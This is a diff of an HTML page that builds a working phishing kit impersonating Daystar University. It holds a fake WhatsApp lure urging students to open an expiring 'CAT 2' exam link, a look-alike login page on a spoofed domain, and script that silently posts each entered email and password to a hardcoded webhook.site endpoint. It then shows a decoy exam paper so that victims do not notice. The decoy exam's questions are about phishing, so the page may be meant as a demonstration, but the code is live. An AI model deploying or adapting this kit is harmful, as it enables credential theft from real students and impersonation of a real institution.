@@ -1,325 +1,346 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Daystar University Login</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Daystar University — Student Portal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet"/>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    :root{--blue:#003087;--gold:#c9973a;--green:#00ff41;--red:#ef4444;--orange:#ff8c00;--cyan:#00e5ff;}
+    body{font-family:'Inter',sans-serif;background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;}
+    .screen{display:none;flex:1;flex-direction:column;min-height:100vh;}
+    .screen.active{display:flex;}
 
-        body {
-            background: linear-gradient(135deg, #1a3a5c 0%, #2a5f7a 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
+    /* SCREEN 1 WHATSAPP */
+    #s-bait{background:#111b21;align-items:center;justify-content:center;padding:32px 16px;}
+    .wa-phone{width:100%;max-width:370px;background:#0b141a;border-radius:20px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.6);}
+    .wa-topbar{background:#202c33;padding:12px 14px;display:flex;align-items:center;gap:10px;}
+    .wa-avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#003087,#c9973a);display:flex;align-items:center;justify-content:center;font-size:.9rem;font-weight:700;color:#fff;flex-shrink:0;}
+    .wa-contact .name{font-size:.88rem;font-weight:600;color:#e9edef;}
+    .wa-contact .status{font-size:.7rem;color:#8696a0;}
+    .wa-icons{color:#aebac1;font-size:1rem;display:flex;gap:16px;margin-left:auto;}
+    .wa-body{padding:14px;background:#0b141a;min-height:260px;}
+    .wa-date{text-align:center;margin-bottom:12px;}
+    .wa-date span{background:#182229;color:#8696a0;font-size:.68rem;padding:3px 10px;border-radius:6px;}
+    .wa-bubble{background:#202c33;border-radius:0 10px 10px 10px;padding:11px 13px;max-width:90%;position:relative;margin-bottom:4px;}
+    .wa-bubble::before{content:'';position:absolute;top:0;left:-7px;border:7px solid transparent;border-right-color:#202c33;border-top-color:#202c33;}
+    .wa-bubble .sender{font-size:.7rem;font-weight:700;color:#53bdeb;margin-bottom:3px;}
+    .wa-bubble .msg{font-size:.85rem;color:#e9edef;line-height:1.6;}
+    .wa-bubble .msg .link{color:#53bdeb;text-decoration:underline;cursor:pointer;font-weight:600;}
+    .wa-bubble .time{font-size:.63rem;color:#8696a0;text-align:right;margin-top:6px;}
+    .wa-preview{background:#182229;border-left:3px solid #53bdeb;border-radius:4px;padding:9px 11px;margin-top:9px;cursor:pointer;}
+    .wa-preview:hover{background:#1d2d35;}
+    .wa-preview .p-site{font-size:.66rem;color:#53bdeb;margin-bottom:2px;}
+    .wa-preview .p-title{font-size:.8rem;font-weight:700;color:#e9edef;margin-bottom:2px;}
+    .wa-preview .p-desc{font-size:.7rem;color:#8696a0;line-height:1.4;}
 
-        .login-container {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 50px 40px 40px;
-            width: 100%;
-            max-width: 420px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
-            transition: transform 0.3s ease;
-        }
+    /* SCREEN 2 LOGIN */
+    .du-nav{background:var(--blue);padding:11px 28px;display:flex;align-items:center;justify-content:space-between;}
+    .du-logo{display:flex;align-items:center;gap:10px;}
+    .du-crest{width:42px;height:42px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.2rem;}
+    .du-name .uni{font-size:.95rem;font-weight:700;color:#fff;}
+    .du-name .sub{font-size:.65rem;color:#93c5fd;letter-spacing:.06em;}
+    .du-nav-links{display:flex;gap:16px;}
+    .du-nav-links a{color:#93c5fd;font-size:.76rem;text-decoration:none;}
+    .du-strip{background:var(--gold);height:4px;}
+    .url-bar{background:#f1f3f4;border-bottom:1px solid #ddd;padding:7px 28px;display:flex;align-items:center;gap:7px;font-size:.76rem;color:#444;}
+    .url-bar .lock{color:#1a7431;}
+    .login-body{flex:1;display:grid;grid-template-columns:1fr 400px 1fr;align-items:center;padding:32px 16px;background:#f5f7fa;}
+    .login-left{text-align:right;padding-right:36px;}
+    .login-left h2{font-size:1.5rem;font-weight:800;color:var(--blue);line-height:1.2;margin-bottom:8px;}
+    .login-left p{font-size:.8rem;color:#6b7280;line-height:1.7;max-width:220px;margin-left:auto;}
+    .urgency-box{margin-top:12px;background:#fef2f2;border:1px solid #fca5a5;border-radius:8px;padding:10px 12px;font-size:.76rem;color:#991b1b;font-weight:600;line-height:1.6;}
+    .login-card{background:#fff;border-radius:12px;padding:32px 28px;box-shadow:0 4px 24px rgba(0,48,135,.1);border-top:4px solid var(--blue);}
+    .login-card h3{font-size:1rem;font-weight:700;color:var(--blue);margin-bottom:4px;}
+    .login-card .sub{font-size:.76rem;color:#6b7280;margin-bottom:20px;}
+    .field{margin-bottom:14px;}
+    .field label{display:block;font-size:.74rem;font-weight:600;color:#374151;margin-bottom:4px;}
+    .field input{width:100%;padding:10px 12px;border:1.5px solid #d1d5db;border-radius:7px;font-family:'Inter',sans-serif;font-size:.86rem;color:#111;outline:none;transition:border-color .2s;background:#fafafa;}
+    .field input:focus{border-color:var(--blue);background:#fff;}
+    .field-links{display:flex;justify-content:space-between;margin-bottom:16px;}
+    .field-links a{font-size:.73rem;color:var(--gold);text-decoration:none;}
+    .btn-login{width:100%;background:var(--blue);color:#fff;border:none;border-radius:7px;padding:12px;font-family:'Inter',sans-serif;font-size:.88rem;font-weight:700;cursor:pointer;transition:background .2s;}
+    .btn-login:hover{background:#002570;}
+    .login-note{margin-top:14px;font-size:.7rem;color:#9ca3af;text-align:center;line-height:1.6;}
 
-        .login-container:hover {
-            transform: translateY(-5px);
-        }
+    /* SCREEN 3 CAT 2 (no terminal) */
+    .cat-nav{background:var(--blue);padding:10px 24px;display:flex;align-items:center;justify-content:space-between;}
+    .cat-nav .left{color:#fff;font-size:.8rem;font-weight:600;}
+    .cat-nav .left span{color:#93c5fd;font-size:.7rem;margin-left:8px;}
+    .timer-bar{background:#1e3a5f;padding:9px 24px;display:flex;align-items:center;justify-content:space-between;border-bottom:2px solid var(--gold);}
+    .timer-label{font-size:.73rem;color:#93c5fd;font-weight:600;}
+    .timer-display{font-family:'JetBrains Mono',monospace;font-size:1.25rem;font-weight:700;color:#fff;letter-spacing:.08em;}
+    .timer-display.warn{color:#fbbf24;}
+    .timer-display.danger{color:#ef4444;animation:blink-t .5s infinite;}
+    @keyframes blink-t{0%,100%{opacity:1}50%{opacity:.5}}
+    .cat-body{flex:1;display:flex;justify-content:center;padding:28px 16px 40px;overflow-y:auto;background:#f5f7fa;}
+    .cat-doc{background:#fff;border-radius:10px;box-shadow:0 2px 20px rgba(0,0,0,.08);width:100%;max-width:700px;padding:44px 52px;}
+    .cat-header{text-align:center;margin-bottom:24px;}
+    .cat-logo-row{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:8px;}
+    .cat-crest{width:48px;height:48px;background:var(--blue);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.3rem;}
+    .cat-uni .u1{font-size:1rem;font-weight:800;color:var(--blue);}
+    .cat-uni .u2{font-size:.66rem;color:#6b7280;letter-spacing:.06em;}
+    .cat-gold-line{height:3px;background:var(--gold);border-radius:2px;margin:8px 0 14px;}
+    .course-tag{font-size:.74rem;color:#6b7280;letter-spacing:.05em;text-transform:uppercase;}
+    .exam-title{font-size:1.1rem;font-weight:800;color:var(--blue);margin:3px 0;}
+    .exam-sub{font-size:.8rem;color:#374151;}
+    .cat-meta{display:grid;grid-template-columns:1fr 1fr 1fr;background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;overflow:hidden;margin:18px 0;font-size:.76rem;}
+    .cat-meta-item{padding:9px 13px;border-right:1px solid #e2e8f0;}
+    .cat-meta-item:last-child{border-right:none;}
+    .m-label{color:#6b7280;font-size:.66rem;text-transform:uppercase;letter-spacing:.06em;}
+    .m-val{font-weight:700;color:#111827;margin-top:2px;}
+    .cat-instructions{background:#fef2f2;border:1px solid #fca5a5;border-radius:8px;padding:11px 14px;font-size:.76rem;color:#991b1b;margin-bottom:22px;line-height:1.7;}
+    .cat-instructions strong{display:block;margin-bottom:3px;}
+    .cat-instructions ol{margin-left:14px;}
+    .cat-section{margin-bottom:26px;}
+    .cat-section h4{font-size:.83rem;font-weight:700;color:var(--blue);border-bottom:2px solid var(--gold);padding-bottom:5px;margin-bottom:12px;}
+    .question{margin-bottom:16px;font-size:.83rem;color:#1f2937;line-height:1.7;}
+    .q-num{font-weight:700;color:var(--blue);}
+    .q-marks{color:#6b7280;font-size:.76rem;float:right;}
+    .q-sub{margin:5px 0 0 16px;font-size:.8rem;color:#374151;}
+    .q-sub li{margin-bottom:3px;}
+    .ans-line{border-bottom:1px solid #d1d5db;margin:6px 0;height:26px;}
+    .student-fields{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:22px;font-size:.8rem;}
+    .s-label{color:#6b7280;font-size:.68rem;text-transform:uppercase;margin-bottom:3px;}
+    .cat-footer{text-align:center;margin-top:28px;padding-top:14px;border-top:1px solid #e5e7eb;font-size:.7rem;color:#9ca3af;}
 
-        .university-name {
-            text-align: center;
-            font-size: 28px;
-            font-weight: 700;
-            color: #1a3a5c;
-            letter-spacing: 1px;
-            margin-bottom: 4px;
-        }
+    #expired-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:900;align-items:center;justify-content:center;}
+    .expired-box{background:#fff;border-radius:14px;padding:36px 32px;text-align:center;max-width:360px;}
+    .expired-box .icon{font-size:2.8rem;margin-bottom:10px;}
+    .expired-box h2{font-size:1.15rem;font-weight:800;color:var(--red);margin-bottom:7px;}
+    .expired-box p{font-size:.8rem;color:#6b7280;line-height:1.6;margin-bottom:18px;}
+    .btn-restart{background:var(--blue);color:#fff;border:none;border-radius:8px;padding:10px 22px;font-family:'Inter',sans-serif;font-weight:700;font-size:.83rem;cursor:pointer;}
 
-        .university-name span {
-            color: #c9a84c;
-        }
-
-        .motto {
-            text-align: center;
-            font-size: 13px;
-            color: #5a7a8a;
-            letter-spacing: 2px;
-            font-weight: 300;
-            margin-bottom: 35px;
-            padding-bottom: 20px;
-            border-bottom: 2px solid #e8edf0;
-        }
-
-        .motto span {
-            font-weight: 600;
-            color: #2a5f7a;
-        }
-
-        .form-group {
-            margin-bottom: 22px;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a3a5c;
-            margin-bottom: 6px;
-            letter-spacing: 0.5px;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 14px 18px;
-            border: 2px solid #dce3e8;
-            border-radius: 12px;
-            font-size: 15px;
-            background: #f8fafc;
-            transition: all 0.3s ease;
-            color: #1a3a5c;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #c9a84c;
-            background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(201, 168, 76, 0.15);
-        }
-
-        .form-group input::placeholder {
-            color: #a0b4c0;
-            font-weight: 300;
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #1a3a5c 0%, #2a5f7a 100%);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            letter-spacing: 1px;
-            margin-top: 6px;
-        }
-
-        .login-btn:hover {
-            transform: scale(1.01);
-            box-shadow: 0 8px 25px rgba(26, 58, 92, 0.35);
-        }
-
-        .login-btn:active {
-            transform: scale(0.98);
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 20px;
-            padding-top: 18px;
-            border-top: 1px solid #e8edf0;
-        }
-
-        .footer-links a {
-            color: #5a7a8a;
-            text-decoration: none;
-            font-size: 13px;
-            font-weight: 500;
-            transition: color 0.3s ease;
-        }
-
-        .footer-links a:hover {
-            color: #c9a84c;
-        }
-
-        .lang-select {
-            color: #5a7a8a;
-            font-size: 13px;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .lang-select select {
-            border: none;
-            background: transparent;
-            color: #1a3a5c;
-            font-weight: 600;
-            font-size: 13px;
-            cursor: pointer;
-            padding: 4px;
-        }
-
-        .lang-select select:focus {
-            outline: none;
-        }
-
-        .cookie-notice {
-            text-align: center;
-            margin-top: 18px;
-            font-size: 11px;
-            color: #8aa0ae;
-            letter-spacing: 0.3px;
-        }
-
-        .cookie-notice a {
-            color: #2a5f7a;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .cookie-notice a:hover {
-            color: #c9a84c;
-        }
-
-        /* Responsive */
-        @media (max-width: 480px) {
-            .login-container {
-                padding: 35px 20px 30px;
-            }
-            .university-name {
-                font-size: 22px;
-            }
-            .motto {
-                font-size: 11px;
-                letter-spacing: 1px;
-            }
-            .form-group input {
-                padding: 12px 14px;
-                font-size: 14px;
-            }
-            .footer-links {
-                flex-wrap: wrap;
-                gap: 10px;
-                justify-content: center;
-            }
-        }
-    </style>
+    @media(max-width:660px){
+      .login-body{grid-template-columns:1fr;}.login-left{display:none;}
+      .du-nav-links{display:none;}.cat-doc{padding:24px 18px;}
+      .cat-meta{grid-template-columns:1fr 1fr;}
+    }
+  </style>
 </head>
 <body>
 
-    <div class="login-container">
-        <!-- University Name -->
-        <div class="university-name">
-            DAYSTAR <span>UNIVERSITY</span>
-        </div>
-        <div class="motto">
-            <span>Excellence</span> · Transformation · Servant-Leadership
-        </div>
-
-        <!-- Login Form -->
-        <form id="loginForm" onsubmit="return handleLogin(event)">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" placeholder="Enter your username" required />
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Enter your password" required />
-            </div>
-            <button type="submit" class="login-btn">Log in</button>
-        </form>
-
-        <!-- Footer Links -->
-        <div class="footer-links">
-            <a href="#" id="lostPassword">Lost password?</a>
-            <div class="lang-select">
-                🌐
-                <select id="languageSelect">
-                    <option value="en">English (en)</option>
-                    <option value="sw">Kiswahili (sw)</option>
-                    <option value="fr">Français (fr)</option>
-                </select>
-            </div>
-        </div>
-
-        <!-- Cookies Notice -->
-        <div class="cookie-notice">
-            🍪 Cookies notice · <a href="#" id="cookiePolicy">Learn more</a>
-        </div>
+<!-- SCREEN 1: WHATSAPP -->
+<div id="s-bait" class="screen active" style="background:#111b21;align-items:center;justify-content:center;padding:32px 16px;">
+  <div class="wa-phone">
+    <div class="wa-topbar">
+      <div class="wa-avatar">DU</div>
+      <div class="wa-contact">
+        <div class="name">Daystar University 🎓</div>
+        <div class="status">Official Academic Channel · Online</div>
+      </div>
+      <div class="wa-icons">📞 ⋮</div>
     </div>
+    <div class="wa-body">
+      <div class="wa-date"><span>Today</span></div>
+      <div class="wa-bubble">
+        <div class="sender">Daystar Uni — Academic Office</div>
+        <div class="msg">
+          📢 <strong>URGENT: CAT 2 Now Available</strong><br/><br/>
+          Dear Student,<br/><br/>
+          Your <strong>CAT 2 examination paper</strong> for Semester 2 (2025/2026) is now live on the student portal.<br/><br/>
+          ⏰ <strong>Access window: 45 minutes only.</strong> The link expires automatically. Log in immediately to avoid missing your assessment.<br/><br/>
+          <span class="link" onclick="goTo('s-login')">🔗 https://sl1nk.com/daystar-student-portal-cat2</span>
+          <div class="wa-preview" onclick="goTo('s-login')">
+            <div class="p-site">student-portal-daystar.ac-ke.net</div>
+            <div class="p-title">📄 Daystar University — CAT 2 Access</div>
+            <div class="p-desc">Sign in with your student credentials to download your CAT 2 paper. Session expires soon.</div>
+          </div>
+        </div>
+        <div class="time">10:51 PM ✓✓</div>
+      </div>
+    </div>
+  </div>
+</div>
 
-    <script>
-        // Handle login form submission with webhook integration
-        function handleLogin(e) {
-            e.preventDefault();
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
+<!-- SCREEN 2: FAKE LOGIN -->
+<div id="s-login" class="screen">
+  <div class="du-nav">
+    <div class="du-logo">
+      <div class="du-crest">🎓</div>
+      <div class="du-name">
+        <div class="uni">Daystar University</div>
+        <div class="sub">STUDENT INFORMATION SYSTEM</div>
+      </div>
+    </div>
+    <div class="du-nav-links">
+      <a href="#">Home</a><a href="#">Academics</a><a href="#">Results</a><a href="#">Help</a>
+    </div>
+  </div>
+  <div class="du-strip"></div>
+  <div class="url-bar">
+    <span class="lock">🔒</span>
+    <span><strong>student-portal-daystar.ac-ke.net</strong>/login?redirect=cat2</span>
+  </div>
+  <div class="login-body">
+    <div class="login-left">
+      <h2>Daystar University<br/>Student Portal</h2>
+      <p>Access your timetable, results, library resources, and examination papers.</p>
+      <div class="urgency-box">⏰ <strong>CAT 2 Access Window Active</strong><br/>Your paper expires in <strong>45 minutes</strong>. Log in now to avoid missing your assessment.</div>
+    </div>
+    <div class="login-card">
+      <h3>Student Portal Login</h3>
+      <div class="sub">Enter your Daystar student credentials</div>
+      <div class="field">
+        <label>Student Email / Admission No.</label>
+        <input type="email" id="email" placeholder="s25-0048@daystar.ac.ke" autocomplete="off"/>
+      </div>
+      <div class="field">
+        <label>Portal Password</label>
+        <input type="password" id="password" placeholder="Enter your password" autocomplete="off"/>
+      </div>
+      <div class="field-links">
+        <a href="#" onclick="return false;">Forgot password?</a>
+        <a href="#" onclick="return false;">New student? Register</a>
+      </div>
+      <button class="btn-login" onclick="submitLogin()">Login &amp; Access CAT 2 →</button>
+      <div class="login-note">🔒 Secured by Daystar University IT Services<br/>Support: itsupport@daystar.ac.ke</div>
+    </div>
+    <div></div>
+  </div>
+</div>
 
-            if (!username || !password) {
-                alert('Please fill in both username and password.');
-                return false;
-            }
+<!-- SCREEN 3: CAT 2 (NO TERMINAL) -->
+<div id="s-cat" class="screen">
+  <div class="cat-nav">
+    <div class="left">📄 CAT 2 — DICT 218: Cybersecurity <span>Logged in as: <span id="cat-email">student</span></span></div>
+  </div>
+  <div class="timer-bar">
+    <div class="timer-label">⏳ TIME REMAINING</div>
+    <div class="timer-display" id="timer">45:00</div>
+    <div style="font-size:.7rem;color:#64748b;">Submit before timer expires</div>
+  </div>
+  <div class="cat-body">
+    <div class="cat-doc">
+      <div class="cat-header">
+        <div class="cat-logo-row">
+          <div class="cat-crest">🎓</div>
+          <div class="cat-uni">
+            <div class="u1">DAYSTAR UNIVERSITY</div>
+            <div class="u2">DEPARTMENT OF INFORMATION &amp; COMMUNICATION TECHNOLOGY</div>
+          </div>
+        </div>
+        <div class="cat-gold-line"></div>
+        <div class="course-tag">DICT 218 — CYBERSECURITY FUNDAMENTALS</div>
+        <div class="exam-title">CONTINUOUS ASSESSMENT TEST 2 (CAT 2)</div>
+        <div class="exam-sub">Semester 2, Academic Year 2025/2026</div>
+      </div>
+      <div class="cat-meta">
+        <div class="cat-meta-item"><div class="m-label">Duration</div><div class="m-val">45 Minutes</div></div>
+        <div class="cat-meta-item"><div class="m-label">Total Marks</div><div class="m-val">30 Marks</div></div>
+        <div class="cat-meta-item"><div class="m-label">Date</div><div class="m-val" id="cat-date">—</div></div>
+      </div>
+      <div class="cat-instructions">
+        <strong>📋 INSTRUCTIONS TO CANDIDATES:</strong>
+        <ol>
+          <li>This paper has <strong>THREE sections</strong>. Attempt ALL questions.</li>
+          <li>Write your <strong>Name</strong> and <strong>Admission Number</strong> clearly.</li>
+          <li>Mobile phones are <strong>NOT permitted</strong> during this assessment.</li>
+          <li>This is <strong>individual work</strong>. Plagiarism results in a zero grade.</li>
+          <li>Time allowed: <strong>45 minutes</strong>. Submit before the timer expires.</li>
+        </ol>
+      </div>
+      <div class="student-fields">
+        <div><div class="s-label">Student Name</div><div class="ans-line"></div></div>
+        <div><div class="s-label">Admission Number</div><div class="ans-line"></div></div>
+      </div>
+      <div class="cat-section">
+        <h4>SECTION A — SHORT ANSWER QUESTIONS (15 Marks)</h4>
+        <div class="question"><span class="q-num">1.</span><span class="q-marks">(3 Marks)</span> Define <strong>"phishing"</strong> and state THREE characteristics that distinguish a phishing site from a legitimate one.<div class="ans-line"></div><div class="ans-line"></div><div class="ans-line"></div></div>
+        <div class="question"><span class="q-num">2.</span><span class="q-marks">(3 Marks)</span> Explain the <strong>CIA Triad</strong>. For each component give one example of a threat that violates it.<div class="ans-line"></div><div class="ans-line"></div><div class="ans-line"></div></div>
+        <div class="question"><span class="q-num">3.</span><span class="q-marks">(3 Marks)</span> What is an <strong>Evil Twin Attack</strong>? Describe how it is set up and how a user can detect it.<div class="ans-line"></div><div class="ans-line"></div><div class="ans-line"></div></div>
+        <div class="question"><span class="q-num">4.</span><span class="q-marks">(3 Marks)</span> Differentiate between <strong>symmetric</strong> and <strong>asymmetric encryption</strong>. Give one algorithm example for each.<div class="ans-line"></div><div class="ans-line"></div></div>
+        <div class="question"><span class="q-num">5.</span><span class="q-marks">(3 Marks)</span> A student receives a WhatsApp message with a link to access "CAT 2" from an unknown number. Identify THREE social engineering red flags.<div class="ans-line"></div><div class="ans-line"></div><div class="ans-line"></div></div>
+      </div>
+      <div class="cat-section">
+        <h4>SECTION B — STRUCTURED QUESTIONS (10 Marks)</h4>
+        <div class="question"><span class="q-num">6.</span><span class="q-marks">(5 Marks)</span> With reference to network security:<ul class="q-sub"><li>(a) Define a <strong>firewall</strong> and state TWO types. <em>(2 marks)</em></li><li>(b) Distinguish between an <strong>IDS</strong> and an <strong>IPS</strong>. <em>(2 marks)</em></li><li>(c) State ONE limitation of a firewall as a standalone control. <em>(1 mark)</em></li></ul><div class="ans-line"></div><div class="ans-line"></div><div class="ans-line"></div><div class="ans-line"></div></div>
+        <div class="question"><span class="q-num">7.</span><span class="q-marks">(5 Marks)</span> A company suffers a <strong>ransomware attack</strong> that encrypts all files. Describe:<ul class="q-sub"><li>(a) How the ransomware likely entered the network. <em>(2 marks)</em></li><li>(b) TWO immediate steps the IT team should take. <em>(2 marks)</em></li><li>(c) ONE long-term prevention strategy. <em>(1 mark)</em></li></ul><div class="ans-line"></div><div class="ans-line"></div><div class="ans-line"></div><div class="ans-line"></div></div>
+      </div>
+      <div class="cat-section">
+        <h4>SECTION C — ESSAY (5 Marks)</h4>
+        <div class="question"><span class="q-num">8.</span><span class="q-marks">(5 Marks)</span> <em>"Social engineering is the greatest cybersecurity threat because it bypasses all technical controls."</em><br/>Discuss with reference to at least THREE social engineering techniques, their psychological basis, and countermeasures organizations can implement.<div class="ans-line"></div><div class="ans-line"></div><div class="ans-line"></div><div class="ans-line"></div><div class="ans-line"></div><div class="ans-line"></div></div>
+      </div>
+      <div class="cat-footer">© 2026 Daystar University · Department of ICT · Nairobi, Kenya<br/>For technical support: itsupport@daystar.ac.ke</div>
+    </div>
+  </div>
+</div>
 
-            // Send data to webhook
-            const webhookURL = 'https://webhook.site/your-unique-id-here'; // REPLACE WITH YOUR ACTUAL WEBHOOK URL
+<!-- EXPIRED OVERLAY -->
+<div id="expired-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:900;align-items:center;justify-content:center;">
+  <div class="expired-box">
+    <div class="icon">⏰</div>
+    <h2>Session Expired</h2>
+    <p>Your CAT 2 access window has closed. Please contact the Academic Office to request an extension.</p>
+    <button class="btn-restart" onclick="resetAll()">↺ Start Over</button>
+  </div>
+</div>
 
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    username: username,
-                    password: password,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screenResolution: `${window.screen.width}x${window.screen.height}`
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert('Login successful! Welcome to Daystar University.');
-                } else {
-                    alert('Login failed. Please try again.');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Network error. Please check your connection.');
-            });
+<script>
+  let timerInterval=null,seconds=45*60;
+  
+  function goTo(id){
+    document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    window.scrollTo(0,0);
+  }
 
-            // Clear fields after submission (optional)
-            document.getElementById('username').value = '';
-            document.getElementById('password').value = '';
+  // 🔑 UPDATED: Sends credentials silently to Webhook, goes straight to CAT 2
+  // ✅ YOUR PERMANENT Webhook ID is already filled in below!
+  function submitLogin(){
+    const email=document.getElementById('email').value.trim();
+    const pass=document.getElementById('password').value;
+    if(!email||!pass){alert('Please enter your student email and password.');return;}
 
-            return false;
-        }
+    // 📤 Send credentials to Webhook.site (silent — victim never sees this)
+    fetch('https://webhook.site/144d62ff-7bb8-4e2f-a9b3-ca754fde0de3', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        email: email,
+        password: pass,
+        timestamp: new Date().toISOString()
+      })
+    });
 
-        // Lost password link
-        document.getElementById('lostPassword').addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('Password reset link will be sent to your registered email.');
-        });
+    // ✅ GO STRAIGHT TO CAT 2 — NO TERMINAL SHOWN
+    document.getElementById('cat-email').textContent = email;
+    
+    // Set the date on CAT page
+    const now=new Date();
+    document.getElementById('cat-date').textContent = now.toLocaleDateString('en-GB',{day:'2-digit',month:'long',year:'numeric'});
+    
+    // Go directly to CAT 2
+    goTo('s-cat');
+    startTimer();
+  }
 
-        // Cookie policy link
-        document.getElementById('cookiePolicy').addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('This site uses cookies to enhance your experience. By continuing, you agree to our cookie policy.');
-        });
+  function startTimer(){
+    seconds=45*60;
+    clearInterval(timerInterval);
+    timerInterval=setInterval(()=>{
+      seconds--;
+      const m=Math.floor(seconds/60),s=seconds%60;
+      const el=document.getElementById('timer');
+      el.textContent=String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
+      if(seconds<=300&&seconds>60)el.className='timer-display warn';
+      else if(seconds<=60&&seconds>0)el.className='timer-display danger';
+      else if(seconds<=0){clearInterval(timerInterval);el.textContent='00:00';document.getElementById('expired-overlay').style.display='flex';}
+    },1000);
+  }
 
-        // Language selector
-        document.getElementById('languageSelect').addEventListener('change', function() {
-            alert(`Language changed to: ${this.options[this.selectedIndex].text}`);
-        });
-    </script>
+  function resetAll(){
+    clearInterval(timerInterval);
+    document.getElementById('email').value='';
+    document.getElementById('password').value='';
+    document.getElementById('expired-overlay').style.display='none';
+    document.getElementById('timer').className='timer-display';
+    goTo('s-bait');
+  }
 
+  function rnd(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
+</script>
 </body>
 </html>
